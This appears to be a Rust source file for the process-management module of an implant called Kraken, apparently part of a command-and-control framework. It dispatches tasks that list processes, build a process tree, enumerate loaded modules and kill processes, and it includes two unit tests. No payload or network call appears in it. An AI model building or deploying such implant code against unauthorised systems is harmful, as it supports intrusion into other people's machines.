//! mod-proc: Process enumeration and management module for Kraken implant
//!
//! Provides process listing, tree building, module enumeration, and process termination.

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{process_task, ProcessTask};

mod enumerate;
mod tree;

pub struct ProcModule {
    id: ModuleId,
}

impl ProcModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("proc"),
        }
    }
}

impl Default for ProcModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for ProcModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Process"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: ProcessTask =
            ProcessTask::decode(task_data).map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(process_task::Operation::List(_list)) => {
                let processes = enumerate::list_processes()?;
                Ok(TaskResult::ProcessList(common::ProcessList { processes }))
            }
            Some(process_task::Operation::Kill(kill)) => {
                let force = kill.force.unwrap_or(false);
                enumerate::kill_process(kill.pid, force)?;
                Ok(TaskResult::Success)
            }
            Some(process_task::Operation::Tree(tree_req)) => {
                let processes = enumerate::list_processes()?;
                let result = tree::build_tree(&processes, tree_req.root_pid);
                Ok(TaskResult::ProcessTree(result))
            }
            Some(process_task::Operation::Modules(mods)) => {
                let result = enumerate::list_process_modules(mods.pid)?;
                Ok(TaskResult::ProcessModules(result))
            }
            None => Err(KrakenError::Protocol("missing process operation".into())),
        }
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(ProcModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = ProcModule::new();
        assert_eq!(module.id().as_str(), "proc");
        assert_eq!(module.name(), "Process");
    }

    #[test]
    fn test_invalid_task_data() {
        let module = ProcModule::new();
        let result = module.handle(TaskId::new(), &[0xFF, 0xFE]);
        assert!(result.is_err());
    }
}
